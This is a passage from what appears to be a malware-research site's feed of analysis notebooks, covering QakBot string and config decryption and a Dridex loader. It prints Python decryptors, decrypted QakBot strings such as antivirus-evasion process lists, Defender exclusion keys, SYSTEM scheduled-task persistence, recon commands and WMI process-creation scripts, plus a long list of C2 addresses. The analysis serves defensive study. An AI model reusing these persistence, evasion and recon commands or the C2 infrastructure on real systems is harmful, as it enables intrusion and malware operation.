d828f9cdd7a9a55dc03672c94b36f146cad505977f967a2d50955ebceccedd0091bdb800393da596ad314720cab1eb4a6fc025da87d931a270f1ed2f7d79af23f3e0edfc0adedd5b44d7bde4987ebea1585b4d6094c5c5514217d3698d8de99fb443c03854840d48b269f68232a55ca4387c4a9141aba5c29d0bd694e41a326eec97ee3a2e27abb2ea4d6ec025da87d932a377f0ee2e6267ad21f5e6effe07d1d0234fc1a8909344b5f11f76667d82f5a01a452ed222fedcdf8bf405f95575830750fb0697d5259e7ff3&#39;) # Create string table function def print_strings_table(strings_key, strings_data): strings_out = [] for i in range(len(data)): strings_out.append(strings_key[i%90] ^ strings_data[i]) strings_table = bytes(strings_out).decode(&#39;latin1&#39;) # Print strings table for s in strings_table.split(&#39; x00&#39;): print(s) print_strings_table(key, data) # Create string lookup function def string_lookup(strings_key, strings_data, offset): strings_out = [] for i in range(len(data)): strings_out.append(strings_key[i%len(key)] ^ strings_data[i]) strings_table = bytes(strings_out)[offset:].decode(&#39;latin1&#39;) return strings_table.split(&quot; x00&quot;)[0] print(&quot; n nString lookup(%d): %s&quot; % (0, string_lookup(key, data, 0))) . coreServiceShell.exe;PccNTMon.exe;NTRTScan.exe MBAMService.exe;mbamgui.exe %SystemRoot% SysWOW64 explorer.exe MsMpEng.exe SOFTWARE Microsoft Microsoft Antimalware Exclusions Paths WBJ_IGNORE mpr.dll LocalLow bdagent.exe;vsserv.exe;vsservppl.exe avp.exe;kavtray.exe C: INTERNAL __empty cmd.exe SOFTWARE Wow6432Node Microsoft Windows Defender Spynet . pipe {%02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%02X%02X%02X%02X} wbj.go .cfg Packages iphlpapi.dll image/pjpeg %SystemRoot% SysWOW64 OneDriveSetup.exe Win32_PnPEntity user32.dll %SystemRoot% System32 msra.exe WRSA.exe vbs cscript.exe egui.exe;ekrn.exe FALSE .dll tcpdump.exe;windump.exe;ethereal.exe;wireshark.exe;ettercap.exe;rtsniff.exe;packetcapture.exe;capturenet.exe crypt32.dll ALLUSERSPROFILE shlwapi.dll setupapi.dll vkise.exe;isesrv.exe;cmdagent.exe 1234567890 avgcsrvx.exe;avgsvcx.exe;avgcsrva.exe open t=%s time=[%02d:%02d:%02d-%02d/%02d/%d] SubmitSamplesConsent Winsta0 Create %SystemRoot% SysWOW64 explorer.exe %S.%06d */* mcshield.exe application/x-shockwave-flash SOFTWARE Wow6432Node Microsoft AntiMalware SpyNet ws2_32.dll %SystemRoot% SysWOW64 xwizard.exe reg.exe ADD &#34;HKLM %s&#34; /f /t %s /v &#34;%s&#34; /d &#34;%s&#34; snxhk_border_mywnd Set objWMIService = GetObject(&#34;winmgmts:&#34; &amp; &#34;{impersonationLevel=impersonate}! . %coot cimv2&#34;) Set objProcess = GetObject(&#34;winmgmts:root cimv2:Win32_Process&#34;) errReturn = objProcess.Create(&#34;%s&#34;, null, nul, nul) wpcap.dll select Win32_ComputerSystem SysWOW64 fmon.exe AvastSvc.exe kernel32.dll %SystemRoot% System32 mobsync.exe netapi32.dll Content-Type: application/x-www-form-urlencoded %ProgramFiles(x86)% Internet Explorer iexplore.exe advapi32.dll SOFTWARE Microsoft Windows Defender Exclusions Paths c: %SystemRoot% explorer.exe aswhookx.dll %SystemRoot% explorer.exe https Software Microsoft %ProgramFiles% Internet Explorer iexplore.exe System32 dwengine.exe;dwarkdaemon.exe;dwwatcher.exe Win32_PhysicalMemory type=0x%04X %SystemRoot% System32 xwizard.exe wtsapi32.dll .dat aswhooka.dll LastBootUpTime SELECT * FROM Win32_Processor Mozilla/5.0 (Windows NT 6.1; rv:77.0) Gecko/20100101 Firefox/77.0 Win32_Process Win32_DiskDrive Name fshoster32.exe SpyNetReporting S:(ML;;NW;;;LW) WQL c: hiberfil.sysss SOFTWARE Microsoft Microsoft AntiMalware SpyNet Set objWMIService = GetObject(&#34;winmgmts:&#34; &amp; &#34;{impersonationLevel=impersonate}! . %coot cimv2&#34;) Set colFiles = objWMIService.ExecQuery(&#34;Select * From CIM_DataFile Where Name = &#39;%s&#39;&#34;) For Each objFile in colFiles objFile.Copy(&#34;%s&#34;) Next aaebcdeeifghiiojklmnooupqrstuuyvwxyyaz Caption,Description,Vendor,Version,InstallDate,InstallSource,PackageName SystemRoot SELECT * FROM AntiVirusProduct %SystemRoot% SysWOW64 mobsync.exe wininet.dll CommandLine SELECT * FROM Win32_OperatingSystem winsta0 default ROOT CIMV2 Caption SOFTWARE Microsoft Windows Defender SpyNet NTUSER.DAT Caption,Description,DeviceID,Manufacturer,Name,PNPDeviceID,Service,Status ntdll.dll TRUE SAVAdminService.exe;SavService.exe .exe image/jpeg wmic process call create &#39;expand &#34;%S&#34; &#34;%S&#34;&#39; displayName from userenv.dll urlmon.dll Initializing database... ccSvcHst.exe %SystemRoot% System32 OneDriveSetup.exe ByteFence.exe Win32_Product WScript.Sleep %u Set objWMIService = GetObject(&#34;winmgmts:&#34; &amp; &#34;{impersonationLevel=impersonate}! . %coot cimv2&#34;) Set objProcess = GetObject(&#34;winmgmts:root cimv2:Win32_Process&#34;) errReturn = objProcess.Create(&#34;%s&#34;, null, nul, nul) WSCript.Sleep 2000 Set fso = CreateObject(&#34;Scripting.FileSystemObject&#34;) fso.DeleteFile(&#34;%s&#34;) image/gif abcdefghijklmnopqrstuvwxyz root SecurityCenter2 %SystemRoot% SysWOW64 msra.exe sf2.dll aabcdeefghiijklmnoopqrstuuvwxyyz Win32_Bios %s system32 shell32.dll String lookup(0): coreServiceShell.exe;PccNTMon.exe;NTRTScan.exe . key = unhex(&#39;09bcba05a9423e4ad9256dea6dd6916dbfd2d242e45801f25905afde20b6f88e34d60f78a26a952d8f646efba3467cc65e11720d1559bfc27de9a9b12b5644a2444f8cbb7423ee77544330eb389f0c8214f4b35399147d1dcda0&#39;) data = unhex(&#39;2ccf9a278d674d6ae40531c848a5cd4f84f2f462c07d72d05975c0a945c48be651ba6356c712f02dfc07068fc23517b570740a683576fcb01888ddd40b7916f7646dc2ef5462bb231c0c62a26cc650d14da7e716d4365d329ee329f3f456fd036c1ef90a39a44df3e44d90868062c67d72d0792ae18e0099be8e67b3631e821ef05efb4428baea0a39827f30530d452bd0a50f88c4f54a2225a20926efc91b5081112043478357fe61eb34dbd23ff5142f78a98041ddce25ff2b4c3e906a56bb289bc46dd1b7a662883762933562ddb155c6f8dd7b905b2fe338d071c20d0d89cc3513a02a4d25647b3dd0b50ec9e7e5771531d0362ae2cf22469c043d2c5eb768ed63e47d98d61ff067091da8d27bd3c825db274d77fe001ecd4db3e31f82f7b662883d6fcf7c70af8d45da9eae40b37c0c8225de038f051c8b836b1dc67c3401516620ccb618849a83772527ca302effd0070d8b0f316110c47bed69e36091937ccb415d3f83f429fdef51e10d6c038d7c31b93485c528f2f0f26d903621d72a2580aa5296daab47f42f57f129b562c1272bdb8c1c5ce90d455228256bcaf858d99bc40b7901f6646abc890119cb47663630985bf778e3679fc07dfc6c183de2e46cd0df71cc62110cf90a39a44df3e46dcca0a4328b2b75dc3c7dcae546c491ea55fb7811cc00f04efb0b1cd6cb2310b63b635f3e2777daba18d2cfc34232258f3326e2d111409a18266e588e54ef69f039c2877dfc6c181dbfcf7cc8df25d9305724ad25039901b9fe06caa2f26f952d64802071d6ae458bb9c278f6220ccb07f042fa1053ca936623aa3a7002234a2ddcb2538dca9f743b37c6273ca29e0723801b2026439f18b068ed7995da3dc6600f68bed47a9c9564c52e613eab501e9e1ed6a4558ee0d271d36938f27769c1b520d89dfa47a26e0c8247fb4ce0640dc1ff160ea9396313605138cba37d88dd9f4e2e2182613ab69e0103cc52276110c4719f50d16d87c736f4274f419ac967d8d572da12513dbc573e8208bafd31c9e3fc72b8286e853c77dcb645da94a051ae6a78c307e659fd010f968d2210aa5e7f1779352fd6a70ac986d0473a44d33326e2c80042ee52276315db0ce722a761d49663ad6c5338b8807bd9c93f89674d6aaa4005b519b3e21985f2f737c43b6e9c2a71dc8154d38bfa0ef62a1c821cf849ea100b98d72318fc7e34162d762bdaa3098cd9c3443521d13775ac9e10238d1a30631f8818ec69f614d49c30b9641473aa8e6cc4df25842c1e7cf9145fdd43e6bf5d91e3f264c478758b29608ffc05c5a4dd4da57b1dcf59a771ec0502988d2304a37c314c2d377ccce07db5fac8582221cf777dd0ec1d4d8a18233060844ffa7ed17c91df3fc5624c33fdfc79d3cd60db31562fb549438f15b3913ef0948615a50a44ae146cccac4fc597e8408a5811cc0efa5afc382d8ed13419a82a47177f6630d0ac21bbdcdf2b3c0cda253cf8ff17479d5e3b0e53d652e964b56390e63be1770e79b99209ddc871c0245f29ad0b089208edfc01c8a08d3189286dc92a64c2ae4cd3c3fd55b86b1acd12ae4efa070594cc6b47b03763077e150fd6b0099cc8dd2b0636cd2226e0de3d4e8f103113519f509f5acb46a0e612d5392d5ecdc979dfd56bcf2b596af64401866db8f4199fa1ba23963d01b36a4099ea6583cdd144a4342ee005ed7be6000b94a3630fe602335628667982e221b5f5930e2518fe1813b79b5203ca52271f12eb17eb38826691d420ef664e2fe3c571d99a28da623e&#39;) print_strings_table(key, data) #print(&quot; n nString lookup(%d): %s&quot; % (1246, string_lookup(key, data, 1246))) string_lookup(key, data, 708) . %s &#34;$%s = &#34;%s &#34;; &amp; $%s&#34; powershell.exe schtasks.exe /Create /RU &#34;NT AUTHORITY SYSTEM&#34; /SC ONSTART /TN %u /TR &#34;%s&#34; /NP /F Self test FAILED!!! ProgramData Microsoft whoami /all Red Hat VirtIO;QEMU net localgroup SOFTWARE Microsoft Windows NT CurrentVersion ProfileList error res=&#39;%s&#39; err=%d len=%u Self test OK. arp -a &#34;%s system32 schtasks.exe&#34; /Create /RU &#34;NT AUTHORITY SYSTEM&#34; /tn %s /tr &#34;%s&#34; /SC ONCE /Z /ST %02u:%02u /ET %02u:%02u schtasks.exe /Delete /F /TN %u srvpost.exe;frida-winjector-helper-32.exe;frida-winjector-helper-64.exe route print nslookup -querytype=ALL -timeout=10 _ldap._tcp.dc._msdcs.%s nltest /domain_trusts /all_trusts 5812 3719 .lnk netstat -nao c: ProgramData at.exe %u:%u &#34;%s&#34; /I System32 WindowsPowerShell v1.0 powershell.exe amstream.dll net view /all qwinsta %s %04x.%u %04x.%u res: %s seh_test: %u consts_test: %d vmdetected: %d createprocess: %d cmd /c set /c ping.exe -n 6 127.0.0.1 &amp; type &#34;%s System32 calc.exe&#34; &gt; &#34;%s&#34; System32 WindowsPowerShell v1.0 powershell.exe SOFTWARE Microsoft Windows CurrentVersion Run jHxastDcds)oMc=jvh7wdUhxcsdt2 artifact.exe;mlwr_smpl;sample;sandbox;cuckoo-;virus Virtual ProfileImagePath VIRTUAL-PC ipconfig /all net share A3E64E55_pr;VBoxVideo %s &#34;$%s = &#34;%s ; &amp; $%s &#34; /t4 regsvr32.exe -s . &#39; System32 WindowsPowerShell v1.0 powershell.exe&#39; . Decrypt RSA Public Key . key = unhex(&#39;60441b6a08752e227c50334a08122d395a&#39;) data = unhex(&#39;50c61a483878282b56d67bccff1f2c3861411b698a7421224cd232400a902c386087aa879d75c99ad8e04da00fecffa6838a0df6c32da3251b749690f07c6d027e3a0b5f1e1ac2522a396702b35bc678b0defb6a2b21e8a69b668a06c48612b593c4495f476d5697d5719c35b7125a4a25b62a44244188381473f8acca2a414c20b49e16dc57378d2f742b77aa0b059c2582068062d5bdb42bf959b0fc89fe6cdddb9965248ecda9ea64103bbfc6b53d14bbee029a68e7f382bcc1ab20a4d6d776359d0b6a1b4fdb71ec45093199a066c70119e1cac7164bbb41af1a35b076b667022298addc67a9e71ca25e9e7eca2c592d1ec28a501394b7a36fde1ed22e5746fe08172aa6ef0685c5d59c98b0658f1f4cb9a5506f0d5c31177379f91569473f46186b08740000&#39;) out = [] for i in range(len(data)): out.append(key[i % len(key)] ^ data[i]) tohex(bytes(out)) . b&#39;30820122300d06092a864886f70d01013b215f72e07c540c6eae627340983e1559ddcac3861fc1eff6c231f03ca6f7b4aeb357968736c92d6e5ab4eca04f270a6c1732057e5ed938224c4920cf0bf532b8ccd6537141acbdf16eff28e6fa4286d9cc5b727e3736d3ce1b94409930261a16fc22560978d258506892a4bf0463307087d41ece7a0ed74f30301da27e2bbe59d235ca6ac7908d71991dab96818b42ffa7c9566e86df84d33e707fa4acbd483a999252a922efe1af859bcb64bfbcdf031bbf773a2805d363c17c5351ddbb0ccf7437c3b6972501b35382236fd032ad0d0a57b68fa0379aad14b073a724aa68424716b7a4726fc484e967cc33eb743702e5621f5f88cd7ad5f69f948a9d5cd57f08a2cf581a237e4d474033f107447e65265c70627c752e&#39; . RC4 Decryption . def rc4crypt(data, key): #If the input is a string convert to byte arrays if type(data) == str: data = data.encode(&#39;utf-8&#39;) if type(key) == str: key = key.encode(&#39;utf-8&#39;) x = 0 box = list(range(256)) for i in range(256): x = (x + box[i] + key[i % len(key)]) % 256 box[i], box[x] = box[x], box[i] x = 0 y = 0 out = [] for c in data: x = (x + 1) % 256 y = (y + box[x]) % 256 box[x], box[y] = box[y], box[x] out.append(c ^ box[(box[x] + box[y]) % 256]) return bytes(out) . Config Extraction . import pefile import hashlib import struct SAMPLE_FILE_PATH = &#39;/tmp/qakbot.bin&#39; data = open(SAMPLE_FILE_PATH, &#39;rb&#39;).read() pe = pefile.PE(data=data) # Get the encrypted config from resource rt_string_idx = [ entry.id for entry in pe.DIRECTORY_ENTRY_RESOURCE.entries ].index(pefile.RESOURCE_TYPE[&#39;RT_RCDATA&#39;]) rt_string_directory = pe.DIRECTORY_ENTRY_RESOURCE.entries[rt_string_idx] resource_data = None # The resource name is hardcoded -- needs to be dynamic for entry in rt_string_directory.directory.entries: if str(entry.name) == &#39;3719&#39;: data_rva = entry.directory.entries[0].data.struct.OffsetToData size = entry.directory.entries[0].data.struct.Size resource_data = pe.get_memory_mapped_image()[data_rva:data_rva+size] # Build decryption key -- change to dynamic extraction key_string = rb&#39; System32 WindowsPowerShell v1.0 powershell.exe&#39; m = hashlib.sha1() m.update(key_string) key_bytes = m.digest() out = rc4crypt(resource_data, key_bytes) # Config has a SHA1 intergrity check followed by binary ip addresses print(&quot;Config SHA1: %s&quot; % tohex(out[:20])) ip_table = out[21:] for ptr in range(0,len(ip_table),7): ip_string = &quot;%d.%d.%d.%d&quot; % (ord(ip_table[ptr:ptr+1]), ord(ip_table[ptr+1:ptr+2]), ord(ip_table[ptr+2:ptr+3]), ord(ip_table[ptr+3:ptr+4])) port_string = struct.unpack(&#39;&gt;H&#39;, ip_table[ptr+4:ptr+6])[0] print(&quot;%s:%s&quot; % (ip_string,port_string)) . Config SHA1: b&#39;ffe5a5fda14380c41fe6fcf4b5c0032ba5e22efe&#39; 32.221.229.7:443 140.82.49.12:443 24.152.219.253:995 182.56.99.126:443 76.169.147.192:32103 218.101.110.3:995 89.101.97.139:443 82.152.39.39:443 176.24.150.197:443 96.37.113.36:993 68.186.192.69:443 59.88.168.108:443 75.110.250.187:443 182.191.92.203:995 89.165.88.95:443 103.142.10.177:443 45.9.20.200:2211 24.95.61.62:443 194.36.28.26:443 78.101.82.198:2222 37.211.157.100:61202 70.163.1.219:443 31.215.99.73:443 103.143.8.71:6881 59.6.7.83:61200 63.153.187.104:443 14.96.79.22:61202 93.48.80.198:995 24.53.49.240:443 94.200.181.154:995 149.135.101.20:443 24.178.196.158:2222 209.210.95.228:32100 78.101.82.198:443 67.209.195.198:443 96.80.109.57:995 80.14.196.176:2222 38.70.253.226:2222 24.222.20.254:443 217.165.123.47:61200 74.15.2.252:2222 217.128.93.27:2222 102.65.38.67:443 190.73.3.148:2222 79.167.192.206:995 95.5.133.68:995 114.79.148.170:443 120.150.218.241:995 186.64.87.213:443 65.100.174.110:443 96.21.251.127:2222 136.232.34.70:443 63.143.92.99:995 65.100.174.110:443 136.143.11.232:443 39.49.27.10:995 111.125.245.116:995 41.228.22.180:443 217.164.247.241:2222 83.110.107.123:443 76.25.142.196:443 74.5.148.57:443 65.128.74.102:443 67.165.206.193:993 173.21.10.71:2222 71.74.12.34:443 94.60.254.81:443 23.233.146.92:443 73.151.236.31:443 79.160.207.214:443 213.120.26.24:443 89.137.52.44:443 75.188.35.168:443 109.12.111.14:443 106.51.48.170:50001 68.204.7.158:443 78.101.82.198:995 96.80.109.57:995 80.6.192.58:443 41.96.250.164:995 114.79.145.28:443 188.54.96.91:443 105.198.236.99:995 50.238.6.36:443 65.100.174.110:8443 70.51.134.181:2222 117.248.109.38:21 83.110.107.123:443 86.98.53.83:443 182.176.180.73:443 217.165.11.65:61200 103.143.8.71:995 50.237.134.22:995 187.189.86.168:443 100.1.119.41:443 2.178.67.97:61202 86.198.237.51:2222 88.253.171.236:995 73.171.4.177:443 40.134.247.125:995 72.252.201.34:995 190.39.205.165:443 187.172.146.123:443 92.167.4.71:2222 189.30.244.252:995 194.36.28.26:443 105.111.124.76:443 84.199.230.66:443 14.96.67.177:443 50.238.6.36:443 182.56.57.23:995 87.70.93.215:443 93.48.58.123:2222 73.5.119.219:443 75.169.58.229:32100 173.71.147.134:995 173.71.147.134:995 69.46.15.180:443 23.82.128.108:443 5.36.7.212:443 200.75.131.234:443 82.77.137.101:995 187.201.90.81:443 24.55.112.61:443 201.172.31.95:443 216.238.72.121:443 216.238.71.31:995 207.246.112.221:443 207.246.112.221:995 216.238.72.121:995 216.238.71.31:443 27.223.92.142:995 216.238.71.31:443 207.246.112.221:995 207.246.112.221:443 216.238.72.121:443 216.238.71.31:995 216.238.72.121:995 24.229.150.54:995 117.198.149.221:443 216.238.71.31:443 207.246.112.221:443 216.238.72.121:443 216.238.71.31:995 207.246.112.221:995 216.238.72.121:995 207.246.112.221:995 216.238.72.121:995 207.246.112.221:443 216.238.71.31:995 . TODO . add dynamic extraction for the decryption key | add dynamic extraction for the resource names | decrypt the other resource | fix ip extraction to use struct | validate the extract configs using the sha1 hash | .",
            "url": "https://research.openanalysis.net/qakbot/qbot/malware/config/2021/12/22/qakbot.html",
            "relUrl": "/qakbot/qbot/malware/config/2021/12/22/qakbot.html",
            "date": " • Dec 22, 2021"
        }
        
    
  
    
        ,"post27": {
            "title": "Dridex (DoppelDridex) Loader",
            "content": "Overview . Sample (unpacked): c7990f1e72fdfa84552f02f9d11cabb74251b0508291af5366fefcee646f9c91 . References: . UnpacMe Parent: 375167a16a6beeee52910d6424eb884c631ada9bcb9843809eecd0475718e549 | Malware Bazaar | Unpacked Sample (Malshare) | Appgate dridex ioc extraction (prior research) | API Resolving blog (Chuong Dong) | Nice extractor from CAPE | . Helper Functions . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . Known Data (Config) From Joe Sandbox . { &quot;Version&quot;: 22201, &quot;C2 list&quot;: [ &quot;103.42.56.15:443&quot;, &quot;169.255.57.61:8116&quot;, &quot;128.199.192.135:6602&quot; ], &quot;RC4 keys&quot;: [ &quot;s6ptqqQ96C42ODZyFUv32gPAVtURlPXrif68ogKV96MSXkXTs&quot;, &quot;rZP9KOr8K1zzIudGa98GqFxsSgNXTDprMuKqtLAWjx1u1prqdOQuZjmv5&quot; ] } . RC4 Decryption . def rc4crypt(data, key): #If the input is a string convert to byte arrays if type(data) == str: data = data.encode(&#39;utf-8&#39;) if type(key) == str: key = key.encode(&#39;utf-8&#39;) x = 0 box = list(range(256)) for i in range(256): x = (x + box[i] + key[i % len(key)]) % 256 box[i], box[x] = box[x], box[i] x = 0 y = 0 out = [] for c in data: x = (x + 1) % 256 y = (y + box[x]) % 256 box[x], box[y] = box[y], box[x] out.append(c ^ box[(box[x] + box[y]) % 256]) return bytes(out) . APLib . Credit: Sandor Nemes (snemes) . import struct from binascii import crc32 from io import BytesIO __all__ = [&#39;APLib&#39;, &#39;decompress&#39;] __version__ = &#39;0.6&#39; __author__ = &#39;Sandor Nemes&#39; class APLib(object): __slots__ = &#39;source&#39;, &#39;destination&#39;, &#39;tag&#39;, &#39;bitcount&#39;, &#39;strict&#39; def __init__(self, source, strict=True): self.source = BytesIO(source) self.destination = bytearray() self.tag = 0 self.bitcount = 0 self.strict = bool(strict) def getbit(self): # check if tag is empty self.bitcount -= 1 if self.bitcount &lt; 0: # load next tag self.tag = ord(self.source.read(1)) self.bitcount = 7 # shift bit out of tag bit = self.tag &gt;&gt; 7 &amp; 1 self.tag &lt;&lt;= 1 return bit def getgamma(self): result = 1 # input gamma2-encoded bits while True: result = (result &lt;&lt; 1) + self.getbit() if not self.getbit(): break return result def depack(self): r0 = -1 lwm = 0 done = False try: # first byte verbatim self.destination += self.source.read(1) # main decompression loop while not done: if self.getbit(): if self.getbit(): if self.getbit(): offs = 0 for _ in range(4): offs = (offs &lt;&lt; 1) + self.getbit() if offs: self.destination.append(self.destination[-offs]) else: self.destination.append(0) lwm = 0 else: offs = ord(self.source.read(1)) length = 2 + (offs &amp; 1) offs &gt;&gt;= 1 if offs: for _ in range(length): self.destination.append(self.destination[-offs]) else: done = True r0 = offs lwm = 1 else: offs = self.getgamma() if lwm == 0 and offs == 2: offs = r0 length = self.getgamma() for _ in range(length): self.destination.append(self.destination[-offs]) else: if lwm == 0: offs -= 3 else: offs -= 2 offs &lt;&lt;= 8 offs += ord(self.source.read(1)) length = self.getgamma() if offs &gt;= 32000: length += 1 if offs &gt;= 1280: length += 1 if offs &lt; 128: length += 2 for _ in range(length): self.destination.append(self.destination[-offs]) r0 = offs lwm = 1 else: self.destination += self.source.read(1) lwm = 0 except (TypeError, IndexError): if self.strict: raise RuntimeError(&#39;aPLib decompression error&#39;) return bytes(self.destination) def pack(self): raise NotImplementedError def aplib_decompress(data, strict=False): packed_size = None packed_crc = None orig_size = None orig_crc = None if data.startswith(b&#39;AP32&#39;) and len(data) &gt;= 24: # data has an aPLib header header_size, packed_size, packed_crc, orig_size, orig_crc = struct.unpack_from(&#39;=IIIII&#39;, data, 4) data = data[header_size : header_size + packed_size] if strict: if packed_size is not None and packed_size != len(data): raise RuntimeError(&#39;Packed data size is incorrect&#39;) if packed_crc is not None and packed_crc != crc32(data): raise RuntimeError(&#39;Packed data checksum is incorrect&#39;) result = APLib(data, strict=strict).depack() if strict: if orig_size is not None and orig_size != len(result): raise RuntimeError(&#39;Unpacked data size is incorrect&#39;) if orig_crc is not None and orig_crc != crc32(result): raise RuntimeError(&#39;Unpacked data checksum is incorrect&#39;) return result . Test Data Decrypt . data = unhex(&#39;991fd7128ac6c8165a9d2daf172ef27944fd14f1fcaed3ff7f8cc4e02e434d439ee2becd4f076605a7bb5e20a2f4a73fa6c59f94cd7729eaa202576c1d33f0fc725fcdccd2b1d4dfb60c11f8d68aa7cc7acd78f97a9f9d777508d3d53c9c5fe6c64bb834f97680548dc6f093328097283261926ff58e662476ec8689b0b136ce9d7a8aa27a884c559fd5a60358f54c150587b89b01d6a3abdb2ec419029df02ce69c9997821cb14c8b2a4bbd74b747921650b98c93b50db1e557aa258b31397fe4ae9fde0f042dc856a2ed2865ccc639820ae7e94042f5deaa9c2d41f6a3034a251d954642e76b48002a2479ad96dea13bb77e74b1c28fbf5c61da648def0b3e99eda2a396594e3f59b3bc5d22c39f7aacc792a4e3db0bacdc5623dc2a333b8de3f27f3075ad2fd2a118b903e1f1f5fed45bde3fc1df0047f05ab27f0617a690440bba697ced12a1003eba57e49b69d40b9e4cbaf640ea8f03a57d2dc3507377ac4732a2eac76a10fc562139b3cc3cf616641feaeae1d580a4092f9ba3dbb0296ac8c7669d5c3635e2b2de5e05c2b2090c470b842be348f8aa35cac0b5a216d089689d88cb4f84d4a399c31d6acdb1bc7f86094fade26c3070bda7a37ae3254f94170f6163e8bef596c9025975d67bdcd1bf35cfdbed3ce789785f6d3c71b0472514dd2672c496d0fff1f5609ad632120c243930e481732ec5791ef33d0e7de20f925dc21f7aeeaea6a08af88ba3ae57863209f07d860cc0a54910043566ad4bdb4287a0fccce20685ec03f350a2fd22d7aaffb17304b5b7466fe317f624d91f53bf8d4d96369c810c0beae24c9307d555963ef0b3fd90fa1e7c99475a4b2c19047b356ca0e1220be20ba501f6e9c7e93a7803066d570be2d9f246a07ac151ec78ed665ab3ca827e6d03fe941b1ccc6e0d1a146c03c5751fe38e12781d34c90bf7636f9e5e322af63ba2e4fe71f6a2dffc05db028d5e3ac27a9a823c3c4471063f41a12263dd6378d32b602b6900d2de732ff215390ac8392fc6309f521e6a35d419dd8eb6a3be617fb48fc1ccbe1d640736b8fec3065a66b119fb7bdbf192bd9efd25c806a5cbb47d2fbcf3f5d2bd6a30a36617cc19bea06730e85417d006a44d35072fdb24dcb358c94b898a2fa80ab797113b636af50350a20cfb54ce441b15d26e62745354c223d342654e534a929ff5140b8bcba469e24794d795065ba8734b84d2063ae762d112fe5415266bab8ae35d10d68df561631acca2e69e61704bc4ee498c1c276c56251d3c7e5314e043bc6281d644e5e38d9fad56cb3284f2d2819b42423bd914bb7e75e46f47fce8f6da23c451d244bb807a5ce4399158f036b9364f6a91022ccc34dea34a2c00a0003c3fb773061c060a426c1ecd5aadbcaaccbe0146057cde291bf5f2968a58bb8d2a3793aa0431b6a5b20357eef157c0ed2340925c6ec1eb083d1edb3fe4fe72c2b9660507dee987cd5b612c5bf1048149c609feb0b658766af44f6368c6fd8ab2be56c4b1b102006681ab2423d9b47b6cda3445f7209c3b61d20f1a5855296a0d8bdae82b44a16e202b266bbd244c7918298b5d27ae28c775ff8f9b03220a9ace2f4e10474ae6db402f4deca0c54553cfabc348f8a3c45cb960b1272fb9434d0168af93a8d0201671b224fdca05281873e7cb5b3bb96a52657ed4de823c65422b44e1302509a8267ca8dc868ae3014add43e25c862210bc54118ab89893aa53f8da4adc008081a5dd95b50db9322f93a90b3daa5d36ce09680e6aad0f2a1bfe79d0136bf99bdeb13572ea6ed03e85f5e124eae9aad92310129a195f1ee97045db33f0acae6f13e7d3c909b9746901116c91b6d594574ba33192d244b82bdd03dc9c8bd88b6515257a95f85314037a6dd12291b9982d05eb87c83defcc47344f0200c4d395ad6fd43dce7475f284bb82e71efbef5aa1d58ce5dad95c5d584997e24629a6879afe7d06b6191564c9ace2ad8db1f64d0a0a6d5df4e7d5bd2868ef48347662e3d8ab3e579962c2a161588fc8fdde43bdf32ff4132aceed418999a5db02d3a38bacbc18360a42bc4f5a0ee6f4ae6d21f824ec237f2e9ca10ada9d9966a6d87a07f9313f6701702f12dd5b8cd1cce1e7cdeeac49bdfa3be62f1ec03d41ab5b7c7914d7ad5723d0e7acd8d2cac1d6473114e6562d08b27b4575864d22ca749ff148dd3478952cb03b663655fcd40cc26c4b444bada92fbbc6bbae16fc56316252dca3bf230c6b24d693f6f285da&#39;) key = data[:48][::-1] data = data[48:] b64_data = rc4crypt(data, key) import base64 import struct cmp_data = base64.b64decode(b64_data) decompressed_data_len = struct.unpack(&#39;&lt;I&#39;,cmp_data[:4]) print(&quot;decompressed data len: %d&quot; % decompressed_data_len) out = aplib_decompress(cmp_data[4:]) SHELLCODE_FILE = &#39;/tmp/dridex_shell1.bin&#39; open(SHELLCODE_FILE, &#39;wb&#39;).write(out) . decompressed data len: 1549 . 1549 . Shellcode Analysis . The loader checks to see if the process is 64 or 32 bit and then decryptes a shellcode blob and injects it along with a struct containing an IAT and other information. . 32bit shellcode (malshare) . To be analyzed... . gap_size = 68 for i in range(0, gap_size, 4): print(f&quot;DWORD dword_{i:0x};&quot;) . DWORD dword_0; DWORD dword_4; DWORD dword_8; DWORD dword_c; DWORD dword_10; DWORD dword_14; DWORD dword_18; DWORD dword_1c; DWORD dword_20; DWORD dword_24; DWORD dword_28; DWORD dword_2c; DWORD dword_30; DWORD dword_34; DWORD dword_38; DWORD dword_3c; DWORD dword_40; . shell_data_2 = unhex(&#39;4b93941a5f7671df49d159c96b178e1c96667e2ab79238f78d625bd468c1f2aee57a345f03721206fdee52034c3453b52c5d1fc76b2785b91e3442b9ea78da4e4f20eccb69cc1c0f2001fe7ccb6e9c5f8977f6fa89358a57ffd44f5c1e29213a3deaeb45160c655972cfcfc04a1260a89eff479e263dd500f6ec1ed713acb5bff9e2de331dc8dee30a67802dd8c66373af26c356d488013d52a220df8609d784ecad7ddeb888d436aa0c5451b69f2f03f51041538f3a2dcaf92db0968e27c81f9c34ee317777acaf53ecba288b5f0803cf29ba6170fe83f96d5c702a1c2aea4ebd21df44c62eb956db897631675f8e3f5f79e2b1498a47043b56d31d146c53fc53751433f89e8e2828c4bab1ddd49b13ec78fe91b890e617c907fde9653527b07d31801d42418e23fb9b2d715ed8b2a07495e102c97b36183e29e2baf47f&#39;) key = shell_data_2[:48][::-1] data = shell_data_2[48:] b64_data = rc4crypt(data, key) import base64 import struct cmp_data = base64.b64decode(b64_data) decompressed_data_len = struct.unpack(&#39;&lt;I&#39;,cmp_data[:4]) print(&quot;decompressed data len: %d&quot; % decompressed_data_len) out = aplib_decompress(cmp_data[4:]) SHELLCODE_FILE_2 = &#39;/tmp/dridex_shell2.bin&#39; open(SHELLCODE_FILE_2, &#39;wb&#39;).write(out) . decompressed data len: 245 . 245 . Test String Decryption . data = unhex(&#39;63208a6488442f57a8414b4928cc1bb9660867a6c23f352adfa702ff121ceee14c69499849e264128bb21bda7fa2a8493244d4377003ec3caae05dc6a76ac7678acd82ca4b2ccceaf0602504576bc9c96223fda05aba4bbff6769f74bc7a3645839a41c4f610217d74d7d203cf38a89af0c05566f5e9301ea7d83f5102e8f324f90d3d38c0773e1a8db5dc6fb5808076269b686b40c6380c37de737d8838e530fac67a&#39;) key = data[:48][::-1] data = data[48:] out = rc4crypt(data, key) for s in out.split(b&#39; x00 x00&#39;): print(s.replace(b&#39; 